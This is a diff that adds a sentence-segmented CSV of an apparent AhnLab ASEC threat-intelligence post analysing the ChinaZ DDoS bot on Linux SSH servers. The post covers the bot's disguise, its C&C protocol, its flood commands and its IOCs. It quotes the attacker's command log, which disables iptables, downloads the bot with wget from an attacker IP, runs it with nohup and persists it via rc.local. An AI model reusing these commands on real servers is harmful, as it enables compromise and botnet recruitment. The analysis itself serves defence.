@@ -1,0 +1,205 @@
+Number,Content
+Sentence 1,"Posted By Sanseo , March 24, 2023
+ChinaZ DDoS Bot Malware Distributed to Linux SSH Servers
+AhnLab Security Emergency response Center (ASEC) has recently discovered the ChinaZ DDoS Bot malware being installed on inadequately managed Linux SSH servers."
+Sentence 2,"As one of the Chinese threat groups that were first discovered around 2014, the ChinaZ group installs various DDoS bots on Windows and Linux systems."
+Sentence 3,"[1] Major DDoS bots assumed to have been created by the ChinaZ threat group include XorDDoS, AESDDos, BillGates, and MrBlack."
+Sentence 4,This article will cover the DDoS bot known as ChinaZ or ChinaZ DDoSClient.
+Sentence 5,1.
+Sentence 6,"Attack Campaigns Against Linux SSH Servers
+While desktop environments are typically used by average users, servers are designed to provide specialized services."
+Sentence 7,"Due to this, malware infections usually happen on desktop environments through web browsers or email attachments."
+Sentence 8,Threat actors also distribute their malware disguised as normal programs to trick users into installing them.
+Sentence 9,"The above methods, however, have limitations when trying to target server environments, so threat actors have to use a different approach."
+Sentence 10,A prime example of this would be when targeting servers that are poorly managed or are open to vulnerability attacks due to not having been patched to the most recent version.
+Sentence 11,Simple account credentials are a common form of poorly managed services as they are vulnerable to dictionary attacks.
+Sentence 12,"For example, Remote Desktop Protocol (RDP) and MS-SQL services are one of the main attack vectors of Windows operating systems."
+Sentence 13,"In Linux server environments, Secure Shell (SSH) services are a common target while the Telnet service is a target for dictionary attacks in old Linux servers or IoT environments where an embedded Linux OS has been installed."
+Sentence 14,The ChinaZ threat group’s ChinaZ DDoSClient that will be covered in this post is assumed to have been installed using account credentials obtained through the use of scanners and the SSH BruteForce malware.
+Sentence 15,"The threat group most likely scanned port 22, the area where SSH services operate, before finding an active SSH service and performing a dictionary attack using commonly used SSH account credentials."
+Sentence 16,"User	Password	Attack Target
+root	–	45.113.163.219
+Table 1."
+Sentence 17,"Account credential used in attacks by ChinaZ
+
+After logging in, the threat group then used a command like the one below to install ChinaZ on the Linux server."
+Sentence 18,"Additionally, the IP address of the threat actor who logged in to the SSH server and the address used to download ChinaZ are the same."
+Sentence 19,"# service iptables stop
+# wget hxxp://45.113.163.219/linux64
+# nohup /root/linux64 > /dev/null 2>&1 &
+# chmod 777 linux64
+# ./linux64
+# chmod 0755 /root/linux64
+# nohup /root/linux64 > /dev/null 2>&1 &
+# chmod 0777 linux64
+# chmod u+x linux64
+# ./linux64 &
+# chmod u+x linux64
+# ./linux64 &
+# cd /tmp
+# service iptables stop
+# wget hxxp://45.113.163.219/linux32
+# nohup /root/linux32 > /dev/null 2>&1 &
+# chmod 777 linux32
+# ./164
+# chmod 0755 /root/linux32
+# nohup /root/linux32 > /dev/null 2>&1 &
+# chmod 0777 linux32
+# chmod u+x linux32
+# ./linux32 &
+# chmod u+x dos6cc4
+# ./linux32 &
+# cd /tmp
+# echo “cd /root/”>>/etc/rc.local
+# echo “./linux64&”>>/etc/rc.local
+# echo “./linux32&”>>/etc/rc.local
+# echo “/etc/init.d/iptables stop”>>/etc/rc.local
+
+The threat actor disabled iptables (which is also the firewall), and used wget to install ChinaZ DDoSClient which has been built for x86 and x64 architectures."
+Sentence 20,The threat actor logged into the root account and installed the downloaded malware into the /root directory.
+Sentence 21,The later installed ChinaZ was executed and registered to rc.local to maintain persistence so that it would operate even after reboots.
+Sentence 22,2.
+Sentence 23,"ChinaZ DDoSClient (Linux)
+A variety of information set by the creator of ChinaZ can be obtained since its debug information is included in its binary."
+Sentence 24,"Adding to this, it is also a type of open-source malware with a public source code."
+Sentence 25,"Upon execution, ChinaZ disguises itself with the name “declient”."
+Sentence 26,"To achieve this, it utilizes a method that sets the argument “PR_SET_NAME” of the prctl() function as “declient”."
+Sentence 27,"By doing so, if the “pstree” command or any other command like “/cat/proc/[pid]/comm” are used to scan the currently running processes, the process “declient” will be seen."
+Sentence 28,Figure 1.
+Sentence 29,"ChinaZ DDoSClient disguised as declient
+
+The “MK64_SecurtDoor” string that can be seen in the code is the Logo string designated by the threat actor and is one of the strings that has seen continuous use since the past."
+Sentence 30,"[2] Additionally, this malware is for the x86 architecture."
+Sentence 31,"In the x64 architecture binary, the name “ceS_46KM” is used as the Logo string."
+Sentence 32,Figure 2.
+Sentence 33,"Logo string set by the threat actor
+
+The C&C server address is encoded in ChinaZ, but it can easily be retrieved through a decryption routine using the CSocketManager::Initalize() method."
+Sentence 34,Figure 3.
+Sentence 35,"Routine to decrypt the C&C server address
+
+The CSocketManager::Woring() method is responsible for the actual features."
+Sentence 36,The CSocketManager::GetOnlineInfo() method is first used to collect the basic information of infected systems before transmitting them to the C&C server.
+Sentence 37,"According to the public source code, the information that is transmitted is LOGININFO struct and it has the following structure."
+Sentence 38,"Offset	Size	Description
+0x0000	0x0040	OS version info (OS name, release information)
+0x0040	0x0020	Version information (G2-F5)
+0x0060	0x0020	CPU information (number of processors, performance)
+0x0080	0x0020	RAM size
+0x00A0	0x0020	Network card information
+0x00C0	0x0010	DDoS attack bandwidth information
+0x00D0	0x0010	CPU usage
+0x00E0	0x0020	Threat actor’s Mark string."
+Sentence 39,"(“UST”)
+0x0100	0x0004	DDoS attack flag (0: Attack in progress, 1: Attack stopped)
+0x0104	0x0004	Number of DDoS attacks currently in progress
+0x0108	0x0080	Status of DDoS attacks currently in progress
+Table 2."
+Sentence 40,"LOGININFO struct
+
+The below routine covers the information collection process from infected systems."
+Sentence 41,"It is notable that various methods can be used to collect information, from the simple method of using functions such as uname() to using “cat” or “ethtool” commands."
+Sentence 42,Figure 4.
+Sentence 43,"Information collection routine
+
+The collected information is transmitted to the C&C server via the CSocketManager::SendOnlineInfo() method, after which malicious behaviors can be performed through commands sent from the C&C server."
+Sentence 44,Figure 5.
+Sentence 45,"Infected system’s information being sent to the C&C server – Linux version
+
+ChinaZ can perform malicious behaviors by receiving commands from the threat actor."
+Sentence 46,The following is a list of commands that can be executed.
+Sentence 47,"Command Number	Command Name	Description
+0x0008	COMMAND_RUN_CMD	Run command
+0x0009	COMMAND_DNS_SET	Set DNS server
+0x0010	COMMAND_DDOS_ATTACK	DDoS attack
+0x0011	COMMAND_DDOS_STOP	Stop DDoS attack
+0x0012	COMMAND_DDOS_SET	Set range of target IP addresses for attack
+0x0014	TOKEN_HEARTBEAT	HeartBeat
+0x0016	TOKEN_LOGO_CHANGE	Change Logo
+0x0017	TOKEN_SET_CPU_LIMIT	Set CPU limit
+0x0018	TOKEN_SET_ONLINE_ADDR	Change C&C server URL
+Table 3."
+Sentence 48,"List of ChinaZ commands (Linux version)
+Figure 6."
+Sentence 49,"Command execution routine
+
+Most of the commands supported by the DDoS bot, ChinaZ, are characteristically DDoS attack commands."
+Sentence 50,"Supported DDoS attacks include SYN, UDP, ICMP, and DNS Flood attacks."
+Sentence 51,"Command Number	Command Name	Description
+0x0001	ATTACK_SYN	SYN Flood
+0x0002	ATTACK_UDP	UDP Flood
+0x0003	ATTACK_ICMP	ICMP Flood
+0x0004	ATTACK_DNS	DNS Flood
+Table 4."
+Sentence 52,"DDoS attack commands
+
+3."
+Sentence 53,"ChinaZ DDoSClient (Windows)
+Although it was not detected in attacks targeting Linux SSH servers, ChinaZ in PE formats can be found on even VirusTotal in attacks targeting Windows systems."
+Sentence 54,"Since it is practically identical to the Linux version, this post will mainly focus on the differences."
+Sentence 55,"ChinaZ for Windows disguises itself with the name “Declient”, much like the Linux version."
+Sentence 56,"To achieve this, it copies itself under the name “Declient.exe” in the %SystemRoot% directory and registers itself to the Run key so that it can operate even after reboots."
+Sentence 57,Figure 7.
+Sentence 58,"ChinaZ registered to the Run key
+The C&C server address and the address of the second C&C server, the backdoor C&C that runs after a set period of time, are the same as the previous Linux version."
+Sentence 59,Figure 8.
+Sentence 60,"Decrypted C&C server address
+While the LOGININFO struct used to store the information collected from the infected system is identical to its Linux counterpart, there are some unused items."
+Sentence 61,"The string “UST” is used as the Mark string, like the Linux version."
+Sentence 62,"Offset	Size	Description
+0x0000	0x0040	OS version information
+0x0040	0x0020	Not used
+0x0060	0x0020	CPU performance information
+0x0080	0x0020	Not used
+0x00A0	0x0020	Not used
+0x00C0	0x0010	DDoS attack bandwidth information
+0x00D0	0x0010	CPU usage
+0x00E0	0x0020	Threat actor’s Mark string."
+Sentence 63,"(“UST”)
+0x0100	0x0004	DDoS attack flag (0: Attack in progress, 1: Attack stopped)
+0x0104	0x0004	Number of DDoS attacks currently in progress
+0x0108	0x0080	Status of DDoS attacks currently in progress
+Table 5."
+Sentence 64,"LOGININFO struct (Windows)
+
+Figure 9."
+Sentence 65,"Infected system’s information being sent to the C&C server – Windows version
+지원하는 명령의 경우 실질적으로 동일하지만 리눅스 버전과 비교해서 수량은 적은 편이다."
+Sentence 66,"DDoS 공격 명령은 SYN, UDP, ICMP, DNS Flood 4가지 모두 동일하다."
+Sentence 67,"Command Number	Command Name	Description
+0x0008	COMMAND_RUN_CMD	Run command
+0x0009	COMMAND_DNS_SET	Set DNS server
+0x0010	COMMAND_DDOS_ATTACK	DDoS attack
+0x0011	COMMAND_DDOS_STOP	Stop DDoS attack
+0x0014	TOKEN_HEARTBEAT	HeartBeat
+Table 6."
+Sentence 68,"List of ChinaZ commands (Windows version)
+
+4."
+Sentence 69,"Conclusion
+Recently, threat actors have been installing the ChinaZ DDoS Bot malware on inadequately managed Linux SSH servers."
+Sentence 70,"These types of attacks have been occurring steadily for some time now, and new instances of such attacks are still being discovered."
+Sentence 71,"If ChinaZ DDoS Bot is installed on a Linux server, the server can be used as a DDoS bot that receives commands from the threat actor to perform DDoS attacks on specific targets."
+Sentence 72,It can also install additional malware or be used in other attacks.
+Sentence 73,"Because of this, administrators should use passwords that are difficult to guess for their accounts and change them periodically to protect the Linux server from brute force attacks and dictionary attacks, and update to the latest patch to prevent vulnerability attacks."
+Sentence 74,Administrators should also use security programs such as firewalls for servers accessible from outside to restrict access by attackers.
+Sentence 75,"Finally, caution must be practiced by updating V3 to the latest version to block malware infection in advance."
+Sentence 76,"File Detection
+– Linux/Ddos.1571389 (2015.05.14)
+– Linux/Ddos.1806356 (2015.05.14)
+– Trojan/Win32.Agent.R192331 (2016.12.25.08)
+
+IOC
+MD5
+– c69f5eb555cc10f050375353c205d5fa : ChinaZ DDoSClient – Linux x86 (linux32)
+– c9eb0815129c135db5bbb8ac79686b9a : ChinaZ DDoSClient – Linux x64 (linux64)
+– 2ec7348e6b6b32d50a01c3ffe480ef70 : ChinaZ DDoSClient – Windows x86 (win32)
+
+Download URLs
+– hxxp://45.113.163.219/linux32
+– hxxp://45.113.163.219/linux64
+– hxxp://45.113.163.219/win32
+
+C&C URLs
+– 45.113.163.219:29134
+– www.911ddos.com:10912"
